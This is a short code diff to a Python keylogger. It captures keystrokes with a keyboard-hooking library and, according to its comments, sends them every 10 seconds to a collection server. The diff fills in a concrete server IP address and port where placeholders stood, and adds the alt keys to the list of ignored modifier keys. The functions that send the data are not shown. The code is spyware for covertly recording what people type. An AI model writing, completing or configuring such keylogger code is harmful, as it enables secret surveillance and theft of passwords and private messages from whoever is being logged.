@@ -15,8 +15,8 @@ import threading
 keystrokes = ""
 
 # Server IP address and port number
-server_ip = "<ip>"
-server_port = "<port>"
+server_ip = "192.168.43.121"
+server_port = "8080"
 
 # Time interval for sending data
 send_interval = 10
@@ -47,7 +47,7 @@ def handle_key_press(key):
         keystrokes += "\t"
     elif key == keyboard.Key.space:
         keystrokes += " "
-    elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
+    elif key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
         pass
     elif key == keyboard.Key.backspace:
         if len(keystrokes) > 0:
